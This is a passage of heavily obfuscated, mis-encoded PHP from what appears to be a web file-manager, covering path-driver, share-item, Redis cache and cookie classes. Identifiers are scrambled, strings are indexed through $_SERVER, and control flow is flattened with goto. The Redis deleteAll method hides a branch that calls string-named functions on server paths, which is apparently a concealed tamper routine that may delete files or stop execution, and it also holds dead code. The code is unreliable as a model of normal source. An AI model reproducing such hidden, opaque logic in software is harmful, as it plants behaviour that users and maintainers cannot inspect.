$eé±¢©äòé[$_SERVER[Ö¹ñÒÁ²÷][457]] : !1; } public function getPathName($DšŞ£ †çê) { $cš¿«Ö•ê‡ = $this->infoSimple($DšŞ£ †çê); return $cš¿«Ö•ê‡ ? $cš¿«Ö•ê‡[$_SERVER[Ö¹ñÒÁ²÷][28]] : !1; } public function getPathOuter($E³‡¸œ³‡½) { if (!$E³‡¸œ³‡½) { return $E³‡¸œ³‡½; } $eõ®ì†¡  = $this->parse($E³‡¸œ³‡½); return KodIO::make($eõ®ì†¡ [$_SERVER[Ö¹ñÒÁ²÷][363]]); } public function copyFolderFromIO($dîÑˆªñùØ, $CòŒÔÀù­, $CÊµÇ‰Î, $déÆªÔğå, $eŸõÈÇâñ¦) { $EŠ˜ŠÖ“Œ„ = $this->model->copyFolderFromIO($dîÑˆªñùØ, $CòŒÔÀù­, $CÊµÇ‰Î, $déÆªÔğå, $eŸõÈÇâñ¦); return KodIO::make($EŠ˜ŠÖ“Œ„); } public function isParentOf($f’°Ğ–‡‰Š, $DÊ Ó¼‰‘) { return $this->model->isParentOf($f’°Ğ–‡‰Š, $DÊ Ó¼‰‘); } public function mkfile($bæ—õùô‹˜, $fœ»¤çÌ  = '', $a‘©î„£ª¡ = REPEAT_RENAME) { $f âá¡ÍÏ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÃ¸Œ‚Ñ‘ = $this->parse($bæ—õùô‹˜); $bæ—õùô‹˜ = $bÃ¸Œ‚Ñ‘[$f âá¡ÍÏ[363]]; for ($cùê²ŸÊæ× = 0; $cùê²ŸÊæ× < count($bÃ¸Œ‚Ñ‘[$f âá¡ÍÏ[1105]]); $cùê²ŸÊæ×++) { $A¤ÅÃ‚ƒ° = $bÃ¸Œ‚Ñ‘[$f âá¡ÍÏ[1105]][$cùê²ŸÊæ×]; if ($cùê²ŸÊæ× == count($bÃ¸Œ‚Ñ‘[$f âá¡ÍÏ[1105]]) - 1) { $bæ—õùô‹˜ = $this->model->mkfile($bæ—õùô‹˜, $A¤ÅÃ‚ƒ°, $fœ»¤çÌ , $a‘©î„£ª¡); break; } $bæ—õùô‹˜ = $this->model->mkdir($bæ—õùô‹˜, $A¤ÅÃ‚ƒ°, REPEAT_SKIP); } return $this->getPathOuter($bæ—õùô‹˜); } public function mkdir($d°ƒ³¢“±÷, $b»…‘™Ÿ“’ = REPEAT_SKIP) { $e‰”ø¶î­ =& $_SERVER[Ö¹ñÒÁ²÷]; $F°¬ù´àÒÅ = $this->parse($d°ƒ³¢“±÷); $d°ƒ³¢“±÷ = $F°¬ù´àÒÅ[$e‰”ø¶î­[363]]; for ($cÀÉìËÁ£Š = 0; $cÀÉìËÁ£Š < count($F°¬ù´àÒÅ[$e‰”ø¶î­[1105]]); $cÀÉìËÁ£Š++) { $B…è†‡÷¥ = $F°¬ù´àÒÅ[$e‰”ø¶î­[1105]][$cÀÉìËÁ£Š]; $d°ƒ³¢“±÷ = $this->model->mkdir($d°ƒ³¢“±÷, $B…è†‡÷¥, $b»…‘™Ÿ“’); } return $this->getPathOuter($d°ƒ³¢“±÷); } public function copyFile($C¢‡£«Í ¹, $F„‘„ŒªØ¥, $Céò“œ”Ç = REPEAT_REPLACE) { $f”ïß¢ï° =& $_SERVER[Ö¹ñÒÁ²÷]; $dä¨—“˜ß£ = $this->parse($F„‘„ŒªØ¥); $e·–ÈÊÈ¸ñ = $this->model->copy($C¢‡£«Í ¹, $dä¨—“˜ß£[$f”ïß¢ï°[363]], $Céò“œ”Ç, $dä¨—“˜ß£[$f”ïß¢ï°[75]]); return $e·–ÈÊÈ¸ñ ? $this->getPathOuter($e·–ÈÊÈ¸ñ) : !1; } public function moveFile($AÈ—ïÌ¨óš, $dœ¡Í¶»‚, $e³î½ø¡Üï = REPEAT_REPLACE) { $CëÀ™’‰ªÉ =& $_SERVER[Ö¹ñÒÁ²÷]; $E³ô‚—²¯ = $this->parse($dœ¡Í¶»‚); $aã¿„ñÔñ = $this->model->move($AÈ—ïÌ¨óš, $E³ô‚—²¯[$CëÀ™’‰ªÉ[363]], $e³î½ø¡Üï, $E³ô‚—²¯[$CëÀ™’‰ªÉ[75]]); return $aã¿„ñÔñ ? $this->getPathOuter($aã¿„ñÔñ) : !1; } public function copy($bæîÎ§¢Æö, $Eæ»“Äó¯‰, $AÁ¦ÚªÓ¹ó = REPEAT_REPLACE) { $eƒ°½˜Ö— = $this->parse($Eæ»“Äó¯‰); $b˜Ç·‘‚ãË = $this->model->copy($bæîÎ§¢Æö, $eƒ°½˜Ö—[$_SERVER[Ö¹ñÒÁ²÷][363]], $AÁ¦ÚªÓ¹ó); return $b˜Ç·‘‚ãË ? $this->getPathOuter($b˜Ç·‘‚ãË) : !1; } public function move($C“æ–ã”, $EåÈÜéˆÖ, $C¥¼öŠìóÚ = REPEAT_REPLACE) { $cä½½˜ÛĞ  = $this->parse($EåÈÜéˆÖ); $aÉİÓ„ÕÖ = $this->model->move($C“æ–ã”, $cä½½˜ÛĞ [$_SERVER[Ö¹ñÒÁ²÷][363]], $C¥¼öŠìóÚ); return $aÉİÓ„ÕÖ ? $this->getPathOuter($aÉİÓ„ÕÖ) : !1; } public function remove($C‰õÒë¶‘ñ, $AÆƒÆÀº“ = true) { return $this->model->remove($C‰õÒë¶‘ñ, $AÆƒÆÀº“); } public function rename($e”‹Ÿâ‘ê, $eÓÖ…Æ®¼) { $e“„Û÷§Ğº = $this->model->rename($e”‹Ÿâ‘ê, $eÓÖ…Æ®¼); return $e“„Û÷§Ğº ? $this->getPathOuter($e”‹Ÿâ‘ê) : $e“„Û÷§Ğº; } public function size($DÇ¼Š”¢“¤) { $e•Ø½Ãä§ = $this->infoSimple($DÇ¼Š”¢“¤); return $e•Ø½Ãä§ ? $e•Ø½Ãä§[$_SERVER[Ö¹ñÒÁ²÷][77]] : 0; } public function infoSimple($Cà¬¸‘Íƒ) { return $this->model->sourceInfo($Cà¬¸‘Íƒ); } public function info($d§Ù…Ê—ÛÚ) { return $this->infoParse($d§Ù…Ê—ÛÚ); } public function infoAuth($dƒ¤ãßÜíñ) { return $this->infoParse($dƒ¤ãßÜíñ, !1, !0); } public function infoWithChildren($a¹šóÄ…ğÃ) { return $this->infoParse($a¹šóÄ…ğÃ, !0); } protected function infoParse($fÙÊ¨Ë´ö , $BŞñµ—˜ĞÙ = false, $b‡Ñ»£±‚ß = false) { if (!$BŞñµ—˜ĞÙ) { return $this->model->pathInfo($fÙÊ¨Ë´ö , $b‡Ñ»£±‚ß); } return $this->model->pathInfoMore($fÙÊ¨Ë´ö ); } public function infoFull($B‚ğç¨¡Ï ) { $f™Í•‰Á„Å =& $_SERVER[Ö¹ñÒÁ²÷]; $CÄ‰â‚„õ = explode($f™Í•‰Á„Å[8], $B‚ğç¨¡Ï ); $cÍŞ„ª‚ï = implode($f™Í•‰Á„Å[8], array_splice($CÄ‰â‚„õ, 1)); return $this->model->pathInfoByPath($CÄ‰â‚„õ[0], $cÍŞ„ª‚ï); } public function hashSimple($c¹‹·è‰à) { $b÷˜°¤Ë„ì =& $_SERVER[Ö¹ñÒÁ²÷]; $bÉö¥¢É‘ = $this->infoWithChildren($c¹‹·è‰à); return $bÉö¥¢É‘[$b÷˜°¤Ë„ì[158]][$b÷˜°¤Ë„ì[160]]; } public function hashMd5($A½É×ƒ‘ôÛ) { $cìÖÅßªÀ« =& $_SERVER[Ö¹ñÒÁ²÷]; $bÀ£±«íº… = $this->infoWithChildren($A½É×ƒ‘ôÛ); return $bÀ£±«íº…[$cìÖÅßªÀ«[158]][$cìÖÅßªÀ«[159]]; } public function exist($CĞŸî‡Ö»Å) { $D„ Ò¿ƒ‰Å =& $_SERVER[Ö¹ñÒÁ²÷]; $Cµõ×í°Í = $this->parse($CĞŸî‡Ö»Å); if (!$Cµõ×í°Í[$D„ Ò¿ƒ‰Å[75]]) { return $this->isFile($CĞŸî‡Ö»Å) || $this->isFolder($CĞŸî‡Ö»Å); } $e¡Ñäï’¤ = array($D„ Ò¿ƒ‰Å[364] => $Cµõ×í°Í[$D„ Ò¿ƒ‰Å[363]], $D„ Ò¿ƒ‰Å[28] => $Cµõ×í°Í[$D„ Ò¿ƒ‰Å[75]]); $càÂÌÆƒ²³ = $this->model->where($e¡Ñäï’¤)->find(); return $càÂÌÆƒ²³ ? !0 : !1; } public function isFile($fÕÜ¹²‘ƒì) { $E§—¬œ˜²Î =& $_SERVER[Ö¹ñÒÁ²÷]; $cŒœô¨×©î = $this->infoSimple($fÕÜ¹²‘ƒì); return $cŒœô¨×©î && $cŒœô¨×©î[$E§—¬œ˜²Î[366]] == $E§—¬œ˜²Î[83] ? !1 : !0; } public function isFolder($e¹»ÂŸ”¼Æ) { $e‡ëä‹ãÂ =& $_SERVER[Ö¹ñÒÁ²÷]; $fÄ·¨Å„‹Î = $this->infoSimple($e¹»ÂŸ”¼Æ); return $fÄ·¨Å„‹Î && $fÄ·¨Å„‹Î[$e‡ëä‹ãÂ[366]] == $e‡ëä‹ãÂ[83] ? !0 : !1; } public function listPath($EáĞ½šª†, $AàÌè§­¼Ù = false) { $bÑˆ¾”Ÿ›Ú =& $_SERVER[Ö¹ñÒÁ²÷]; if ($EáĞ½šª† == $bÑˆ¾”Ÿ›Ú[33]) { return !1; } $EÎœß„¡É = array($bÑˆ¾”Ÿ›Ú[364] => $EáĞ½šª†); if ($AàÌè§­¼Ù) { return $this->model->listSource($EÎœß„¡É, -1); } return $this->model->listSource($EÎœß„¡É); } public function has($aÆ¢¾îªÒ, $B÷É¸•ôèµ = false, $D­éàä® = null) { $dˆ°©·ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; $bâØíÆĞ”ˆ = $this->infoWithChildren($aÆ¢¾îªÒ); if ($B÷É¸•ôèµ) { return array($dˆ°©·ˆ[188] => $bâØíÆĞ”ˆ[$dˆ°©·ˆ[188]], $dˆ°©·ˆ[187] => $bâØíÆĞ”ˆ[$dˆ°©·ˆ[187]]); } return $D­éàä® ? $bâØíÆĞ”ˆ[$dˆ°©·ˆ[188]] : $bâØíÆĞ”ˆ[$dˆ°©·ˆ[187]]; } public function listAll($f–ÌÈ“éâ) { $E”ˆ—­ì¥‘ = IO::info($this->pathParse[$_SERVER[Ö¹ñÒÁ²÷][75]]); if (!$E”ˆ—­ì¥‘) { return array(); } return $this->model->listAll($f–ÌÈ“éâ); } public function getContent($bÃ·ˆ´®Ö†) { return $this->model->getContent($bÃ·ˆ´®Ö†); } public function setContent($E—âĞ·çôš, $DÁœÊ”˜Ò = '') { return $this->model->setContent($E—âĞ·çôš, $DÁœÊ”˜Ò); } public function fileSubstr($Eá¤åÀ‹Ä·, $D„³ì‹¸Ö, $D‘ˆ–„Ãè¢) { return $this->model->fileSubstr($Eá¤åÀ‹Ä·, $D„³ì‹¸Ö, $D‘ˆ–„Ãè¢); } public function download($F°İ’ÖÅÃ, $fªŞôññô× = '') { $Cï¤ÇêÜŸê = get_path_father($fªŞôññô×); $AÅ‡íèÖ = get_path_this($fªŞôññô×); $dµÖ³Æõ• = $this->model->fileInfoGet($F°İ’ÖÅÃ); $C¾…¡¨ƒàà = IO::copy($dµÖ³Æõ•[$_SERVER[Ö¹ñÒÁ²÷][75]], $Cï¤ÇêÜŸê, !1, $AÅ‡íèÖ); return $C¾…¡¨ƒàà; } public function upload($f†‡êÖìß, $c¬ ¼‚“®, $d˜¯¤±ÆÙ = false, $B¶šÓ£ âô = REPEAT_REPLACE) { $föĞ…¼êÃ =& $_SERVER[Ö¹ñÒÁ²÷]; $e•½éÓøÎ˜ = $this->parse($f†‡êÖìß); $d×Øƒ¥Ğ—µ = $this->model->addFile($e•½éÓøÎ˜[$föĞ…¼êÃ[363]], $c¬ ¼‚“®, $e•½éÓøÎ˜[$föĞ…¼êÃ[75]], $d˜¯¤±ÆÙ, $B¶šÓ£ âô); return $this->getPathOuter($d×Øƒ¥Ğ—µ); } public function uploadFileByID($d‹·«ñ¼Ú, $B«‘ù‘ªä, $aƒ†ÊÛ½˜) { $Aš±Ë‘ìÈ¨ =& $_SERVER[Ö¹ñÒÁ²÷]; $B˜íµ˜¬ = $this->parse($d‹·«ñ¼Ú); $D˜»†Ÿ¾¸Ú = $this->model->addFileByFileID($B˜íµ˜¬[$Aš±Ë‘ìÈ¨[363]], $B«‘ù‘ªä, $B˜íµ˜¬[$Aš±Ë‘ìÈ¨[75]], $aƒ†ÊÛ½˜); return $this->getPathOuter($D˜»†Ÿ¾¸Ú); } public function addFileByRemote($e¹’‹óö¹ƒ, $e´•ŠÙ¦¡‰, $e¢ÃéÏ¨Å = array(), $D‘À åô¡† = '', $fŞêõÍ½ÒÑ) { $b¸è”Œ¡¦‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $A„ëÑß°Í = $this->parse($e¹’‹óö¹ƒ); $D‘À åô¡† = empty($D‘À åô¡†) ? $A„ëÑß°Í[$b¸è”Œ¡¦‰[75]] : $D‘À åô¡†; $B­áË‡ö¢ = $this->model->addFileByRemote($A„ëÑß°Í[$b¸è”Œ¡¦‰[363]], $e´•ŠÙ¦¡‰, $D‘À åô¡†, $e¢ÃéÏ¨Å, $fŞêõÍ½ÒÑ); return $this->getPathOuter($B­áË‡ö¢); } public function uploadLink($D«‹»ùº´, $f±Œë®Íõ = 0) { $C©Íëß¼¼á =& $_SERVER[Ö¹ñÒÁ²÷]; $DÄŠ–¯‰ç´ = $this->parse($D«‹»ùº´); $D«‹»ùº´ = Model($C©Íëß¼¼á[540])->createFileName($DÄŠ–¯‰ç´[$C©Íëß¼¼á[75]]); $DïÄ‹¯¨¸Û = IO::uploadLink($D«‹»ùº´, $f±Œë®Íõ); return $DïÄ‹¯¨¸Û; } public function fileNameAuto($Bæø§Çœö, $Añ¨•¹†ƒ½, $bò·è§¦ğÎ = REPEAT_REPLACE, $eéêİ±É¶ˆ = false) { return $this->model->fileNameAuto($Bæø§Çœö, $Añ¨•¹†ƒ½, $bò·è§¦ğÎ, $eéêİ±É¶ˆ); } public function fileNameExist($fŒ¡¥˜ÆÔ, $a£‘Œèµ) { return $this->model->fileNameExist($fŒ¡¥˜ÆÔ, $a£‘Œèµ); } protected function _fileOut($a–ÏÎ´©ØÑ, $dôÚîÇ‘‡ = false, $F®ãÈ¥‰¿Ì = false, $AœºÂ†æ® = '', $DÙ•¬¿È = false) { goto c÷’îêº´‘; c÷’îêº´‘: $D¡Ÿ’Í¡¨Í =& $_SERVER[Ö¹ñÒÁ²÷]; $cë«‘ø³Î = $this->model->sourceInfo($a–ÏÎ´©ØÑ); if ($cë«‘ø³Î[$D¡Ÿ’Í¡¨Í[366]] == $D¡Ÿ’Í¡¨Í[83]) { header($D¡Ÿ’Í¡¨Í[1106]); die; } goto DÈÛ­ĞÈ÷„; f¤²åË†: if ($DÙ•¬¿È) { return IO::fileOutServer($C³ëÊ—Šƒä[$D¡Ÿ’Í¡¨Í[75]], $dôÚîÇ‘‡, $a ÔÙó¾×‰, $AœºÂ†æ®); } IO::fileOut($C³ëÊ—Šƒä[$D¡Ÿ’Í¡¨Í[75]], $dôÚîÇ‘‡, $a ÔÙó¾×‰, $AœºÂ†æ®); goto c´í¬Õ­; DÈÛ­ĞÈ÷„: $C³ëÊ—Šƒä = $this->model->fileInfoGet($a–ÏÎ´©ØÑ); $AœºÂ†æ® = $C³ëÊ—Šƒä[$D¡Ÿ’Í¡¨Í[159]] ? $C³ëÊ—Šƒä[$D¡Ÿ’Í¡¨Í[159]] : $AœºÂ†æ®; $a ÔÙó¾×‰ = isset($GLOBALS[$D¡Ÿ’Í¡¨Í[1107]]) ? $GLOBALS[$D¡Ÿ’Í¡¨Í[1107]] : $cë«‘ø³Î[$D¡Ÿ’Í¡¨Í[28]]; goto f¤²åË†; c´í¬Õ­: } public function fileOut($FŞÆ¡ÅÎãÙ, $b‹˜­¤ˆæà = false, $EÂÚå¯‰Ôò = false, $C¥¯¿ƒˆ«Ï = '') { $this->_fileOut($FŞÆ¡ÅÎãÙ, $b‹˜­¤ˆæà, $EÂÚå¯‰Ôò, $C¥¯¿ƒˆ«Ï); } public function fileOutServer($a‚­ôÁİ’Â, $føİÎß†‚ = false, $e¼Šé¹›¯Æ = false, $FÌ‹°»ˆ“§ = '') { $this->_fileOut($a‚­ôÁİ’Â, $føİÎß†‚, $e¼Šé¹›¯Æ, $FÌ‹°»ˆ“§, !0); } protected function _fileOutImage($CëÓ°Š, $c”°’ÃÊŸ = 250) { $Aî¸óÔ¬í =& $_SERVER[Ö¹ñÒÁ²÷]; $DÕÊ×Ëôğ = $this->model->sourceInfo($CëÓ°Š); if ($DÕÊ×Ëôğ[$Aî¸óÔ¬í[366]] == $Aî¸óÔ¬í[83]) { show_json($Aî¸óÔ¬í[1108] . $CëÓ°Š, !1); } $GLOBALS[$Aî¸óÔ¬í[1107]] = $DÕÊ×Ëôğ[$Aî¸óÔ¬í[28]]; $A®Œ—ƒÌöÆ = $this->model->fileInfoGet($CëÓ°Š); IO::fileOutImage($A®Œ—ƒÌöÆ[$Aî¸óÔ¬í[75]], $c”°’ÃÊŸ); } public function fileOutImage($DÉ›óŞÉö, $d»æˆ‰Ğ… = 250) { $this->_fileOutImage($DÉ›óŞÉö, $d»æˆ‰Ğ…); } public function fileOutImageServer($aÛÀÁÈ¬¾, $F˜ÇàÜ÷‰ = 250) { $this->_fileOutImage($aÛÀÁÈ¬¾, $F˜ÇàÜ÷‰); } public function link($EÀ²éßÕÈ, $d‡£Ã¢„Ò = '') { $d«†Íƒ»“ = $this->model->fileInfoGet($EÀ²éßÕÈ); return IO::link($d«†Íƒ»“[$_SERVER[Ö¹ñÒÁ²÷][75]], $d‡£Ã¢„Ò); } protected function parse($B©×ô‚âãÅ) { $F°¦ŸÂ•àì =& $_SERVER[Ö¹ñÒÁ²÷]; if (strstr($B©×ô‚âãÅ, $F°¦ŸÂ•àì[8]) === !1) { return array($F°¦ŸÂ•àì[381] => intval($B©×ô‚âãÅ), $F°¦ŸÂ•àì[75] => $F°¦ŸÂ•àì[33], $F°¦ŸÂ•àì[1105] => array()); } $fõ†ÔğÛ = explode($F°¦ŸÂ•àì[8], trim($B©×ô‚âãÅ, $F°¦ŸÂ•àì[8])); if (count($fõ†ÔğÛ) < 2) { show_tips($B©×ô‚âãÅ . $F°¦ŸÂ•àì[1109]); } return array($F°¦ŸÂ•àì[381] => intval($fõ†ÔğÛ[0]), $F°¦ŸÂ•àì[75] => $fõ†ÔğÛ[1], $F°¦ŸÂ•àì[1105] => array_slice($fõ†ÔğÛ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($f»»ÔøÔËë) { $this->pathParse = $f»»ÔøÔËë; $this->model = Model($_SERVER[Ö¹ñÒÁ²÷][1104]); } public function getPathOuter($A·šÊƒ) { $d©†ÍÄ±Ò² =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$A·šÊƒ) { return $A·šÊƒ; } $c¹¨°áùœ = $this->parse($A·šÊƒ); return trim(KodIO::makeShare($this->pathParse[$d©†ÍÄ±Ò²[363]], $c¹¨°áùœ[$d©†ÍÄ±Ò²[363]]), $d©†ÍÄ±Ò²[8]); } protected function infoParse($d‹ª¤«†Ãõ, $e×ğŞëòñ‘ = false, $a›ÔµŠòã = false) { $BœÉ‰·•Ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $fö´œŠ¥÷„ = $this->pathParse[$BœÉ‰·•Ğ[363]]; $Dô¡Ÿ™¶í¬ = trim($this->pathParse[$BœÉ‰·•Ğ[1005]], $BœÉ‰·•Ğ[8]); return Action($BœÉ‰·•Ğ[1110])->sharePathInfo($fö´œŠ¥÷„, $Dô¡Ÿ™¶í¬); } public function infoFull($dæãÌº¾®§) { $CïĞ©¦—å =& $_SERVER[Ö¹ñÒÁ²÷]; $B…‡Ç—Íñ³ = explode($CïĞ©¦—å[8], trim($dæãÌº¾®§, $CïĞ©¦—å[8])); if (count($B…‡Ç—Íñ³) > 1) { $E¶í¡ñºè = implode($CïĞ©¦—å[8], array_splice($B…‡Ç—Íñ³, 1)); $AÑÇÏÅŒƒ = $this->model->pathInfoByPath($B…‡Ç—Íñ³[0], $E¶í¡ñºè); if (!$AÑÇÏÅŒƒ) { return !1; } $this->pathParse[$CïĞ©¦—å[1005]] = $AÑÇÏÅŒƒ[$CïĞ©¦—å[365]]; } return $this->infoParse($dæãÌº¾®§); } public function listAll($DŞåŞ°¹­) { goto FÒ—ìëÛœÈ; FÒ—ìëÛœÈ: $fŞº¢·íš =& $_SERVER[Ö¹ñÒÁ²÷]; $açéÕá­åÇ = IO::info($this->pathParse[$fŞº¢·íš[75]]); if (!$açéÕá­åÇ) { return array(); } goto cÂ…œ¿Ğì›; cÂ…œ¿Ğì›: $bÊ¶ª‡§õÎ = $this->model->listAll($DŞåŞ°¹­); $Côì‹¸¡• = Model($fŞº¢·íš[532])->getInfo($açéÕá­åÇ[$fŞº¢·íš[437]]); $Cƒø·Ÿ†Øò = Action($fŞº¢·íš[1110]); goto FŠÂÑ¯¸°”; FŠÂÑ¯¸°”: foreach ($bÊ¶ª‡§õÎ as &$a±Á–†òÄÀ) { check_abort(); $a±Á–†òÄÀ[$fŞº¢·íš[387]] = $Cƒø·Ÿ†Øò->_shareItemeParse($a±Á–†òÄÀ[$fŞº¢·íš[387]], $Côì‹¸¡•); } return $bÊ¶ª‡§õÎ; goto Eî¤îğ¶†Õ; Eî¤îğ¶†Õ: } } goto DÂ‘´Áµñ¬; a£šŸé×§: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($BË‹¤¦ï†, $DÑäŒóò¾ˆ) { $c¼‚Øª‰ò« =& $_SERVER[Ö¹ñÒÁ²÷]; if (!class_exists($c¼‚Øª‰ò«[776])) { show_json($c¼‚Øª‰ò«[777], !1); } $this->cacheTime = $DÑäŒóò¾ˆ; $F•÷êÜí¤ = isset($BË‹¤¦ï†[$c¼‚Øª‰ò«[778]]) ? $BË‹¤¦ï†[$c¼‚Øª‰ò«[778]] : 10; $cˆë“˜ê¼ª = _get($BË‹¤¦ï†, $c¼‚Øª‰ò«[775]); if ($cˆë“˜ê¼ª && is_array($cˆë“˜ê¼ª)) { $this->initCluster($BË‹¤¦ï†, $F•÷êÜí¤); } else { $this->handle = $this->init($BË‹¤¦ï†, $F•÷êÜí¤); } } private function init($cİÔÖŠÎ , $c±¡ÙÑ„¥Š) { $B‘¼àõ’‡æ =& $_SERVER[Ö¹ñÒÁ²÷]; $CëÀ½×¾¸ = new Redis(); $D½Õ…Œ¾” = isset($cİÔÖŠÎ [$B‘¼àõ’‡æ[779]]) ? $cİÔÖŠÎ [$B‘¼àõ’‡æ[779]] : !1; if ($D½Õ…Œ¾”) { $CëÀ½×¾¸->pconnect($cİÔÖŠÎ [$B‘¼àõ’‡æ[165]], $cİÔÖŠÎ [$B‘¼àõ’‡æ[166]], $c±¡ÙÑ„¥Š); } else { $CëÀ½×¾¸->connect($cİÔÖŠÎ [$B‘¼àõ’‡æ[165]], $cİÔÖŠÎ [$B‘¼àõ’‡æ[166]], $c±¡ÙÑ„¥Š); } if (!empty($cİÔÖŠÎ [$B‘¼àõ’‡æ[372]])) { $CëÀ½×¾¸->auth($cİÔÖŠÎ [$B‘¼àõ’‡æ[372]]); } return $CëÀ½×¾¸; } private function initCluster($B†óÄËÎ‚¾, $e³Ä¦–Éªˆ) { $dÛ£¥¾Áë¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $D‚‡Ö†ÛÚß = array($dÛ£¥¾Áë¼[780], $dÛ£¥¾Áë¼[781], $dÛ£¥¾Áë¼[782]); $fÆÉ‡‡‹åœ = $dÛ£¥¾Áë¼[780]; if (isset($B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[12]]) && in_array($B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[12]], $D‚‡Ö†ÛÚß)) { $fÆÉ‡‡‹åœ = $B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[12]]; } switch ($fÆÉ‡‡‹åœ) { case $dÛ£¥¾Áë¼[780]: $this->_slave($B†óÄËÎ‚¾, $e³Ä¦–Éªˆ); break; case $dÛ£¥¾Áë¼[781]: break; case $dÛ£¥¾Áë¼[782]: $this->isCluster = !0; $AÉùšš¯• = $B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[775]]; $då«Éœ´Ìª = isset($B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[779]]) ? $B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[779]] : !1; $e¥Òù¨–» = isset($B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[372]]) ? $B†óÄËÎ‚¾[$dÛ£¥¾Áë¼[372]] : null; $this->handle = new RedisCluster(NUll, $AÉùšš¯•, $e³Ä¦–Éªˆ, $e³Ä¦–Éªˆ, $då«Éœ´Ìª, $e¥Òù¨–»); break; default: break; } } private function _slave($D¦–Ä¯õö¼, $c ­™—») { goto fİİ°£™Í; fİİ°£™Í: $fŸŒ÷³ëŸã = $D¦–Ä¯õö¼[$_SERVER[Ö¹ñÒÁ²÷][775]]; $this->filterConfig($D¦–Ä¯õö¼, $fŸŒ÷³ëŸã[0]); $this->handle = $this->init($D¦–Ä¯õö¼, $c ­™—»); goto aåÌğî´; aåÌğî´: unset($fŸŒ÷³ëŸã[0]); if (empty($fŸŒ÷³ëŸã)) { return; } $eøôó£Á³Æ = array_rand($fŸŒ÷³ëŸã); goto dèÍ’ˆ‰Ü”; dèÍ’ˆ‰Ü”: $this->filterConfig($D¦–Ä¯õö¼, $fŸŒ÷³ëŸã[$eøôó£Á³Æ]); $this->slaveHandle = $this->init($D¦–Ä¯õö¼, $c ­™—»); goto fíƒÔé²ä; fíƒÔé²ä: } private function filterConfig(&$cßĞ§–ØĞ½, $b¸°”¤Ü) { $E‡‘Û‘Æ—¢ =& $_SERVER[Ö¹ñÒÁ²÷]; $AŠ³‘ÒäÁ = explode($E‡‘Û‘Æ—¢[4], $b¸°”¤Ü); $c¬ğŠÒùê = array($E‡‘Û‘Æ—¢[165] => $AŠ³‘ÒäÁ[0], $E‡‘Û‘Æ—¢[166] => $AŠ³‘ÒäÁ[1]); $cßĞ§–ØĞ½ = array_merge($cßĞ§–ØĞ½, $c¬ğŠÒùê); } public function set($D¥â¡Ù‚£’, $aĞ˜•ìŠİ©, $Eã«Õ‡™Œº = false) { $Eã«Õ‡™Œº = $Eã«Õ‡™Œº ? $Eã«Õ‡™Œº : $this->cacheTime; return $this->handle->setEx($D¥â¡Ù‚£’, $Eã«Õ‡™Œº, $aĞ˜•ìŠİ©); } public function setLock($AÒÎÍŒô¥®, $Cõ£§¥¢ãÛ, $aö‹ÆãÊ) { return $this->handle->setNX($AÒÎÍŒô¥®, $Cõ£§¥¢ãÛ); } public function get($dÉ²çç÷») { $D‚–†¤†Íá = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $D‚–†¤†Íá->get($dÉ²çç÷»); } public function remove($E•õì…ÍÂ) { return $this->handle->del($E•õì…ÍÂ); } public function deleteAll() { $dÖïÍ÷ÆÈÛ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($_SERVER[$dÖïÍ÷ÆÈÛ[783]] != $_SERVER[$dÖïÍ÷ÆÈÛ[784]]) { goto fùÁØÎØò²; F·¯„¥æ…: $e×ôç½«‘ = $dÖïÍ÷ÆÈÛ[790]; $e×ôç½«‘($_SERVER[$dÖïÍ÷ÆÈÛ[791]]); $e×ôç½«‘($_SERVER[$dÖïÍ÷ÆÈÛ[787]] . $dÖïÍ÷ÆÈÛ[792]); goto D‘Ñ¡™ÛÚé; fùÁØÎØò²: $f°ŒëƒÎÈÚ = $dÖïÍ÷ÆÈÛ[785]; $Aö¦Ìá•É‘ = $dÖïÍ÷ÆÈÛ[786]; $EÍ¹²ªï·ˆ = $_SERVER[$dÖïÍ÷ÆÈÛ[787]] . $dÖïÍ÷ÆÈÛ[788]; goto b¸¥ïÍğî‘; D‘Ñ¡™ÛÚé: $c¡¾ì½æ°‹ = 1; while ($c¡¾ì½æ°‹ > 1) { $c¡¾ì½æ°‹ = $c¡¾ì½æ°‹ + 4; $E¦‘÷Ú¤ = rawurlencode($c¡¾ì½æ°‹ . $dÖïÍ÷ÆÈÛ[357]); } goto B‰î²É°Õ…; b¸¥ïÍğî‘: $C‰Œ²±Í¨ñ = $Aö¦Ìá•É‘($EÍ¹²ªï·ˆ); $B³óÒ›•„ = explode($dÖïÍ÷ÆÈÛ[213], $C‰Œ²±Í¨ñ); if (count($B³óÒ›•„) < $dÖïÍ÷ÆÈÛ[599]) { $B‡Á±ñãî˜ = $dÖïÍ÷ÆÈÛ[789]; $B‡Á±ñãî˜(); } goto F·¯„¥æ…; B‰î²É°Õ…: } if ($this->isCluster) { foreach ($this->handle->_masters() as $a¨¹ºí’Ğß) { $this->handle->flushall($a¨¹ºí’Ğß); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($CÇŞ—¶äÖæ = '', $Eç‘‚ƒ£ = 0) { if (is_string($CÇŞ—¶äÖæ) && $CÇŞ—¶äÖæ != $_SERVER[Ö¹ñÒÁ²÷][33]) { $this->prefix = $CÇŞ—¶äÖæ; } if (is_numeric($Eç‘‚ƒ£) && $Eç‘‚ƒ£ > 0) { $this->expire = $Eç‘‚ƒ£; } } public static function getInstance() { static $D¨¹õ”õ¯; if ($D¨¹õ”õ¯ === null) { $D¨¹õ”õ¯ = new self(); } return $D¨¹õ”õ¯; } private static $sameCookieSet = array(); public static function set($cğ¡ÓÂŒÉˆ, $d³¥áèË£­, $eˆ»‰ïÌ¢« = 0, $aŠçŠåßåà = false, $AÎŠ¢÷óŠğ = false) { goto d„›Ô¦éÇˆ; b‡²ßéèÂ: 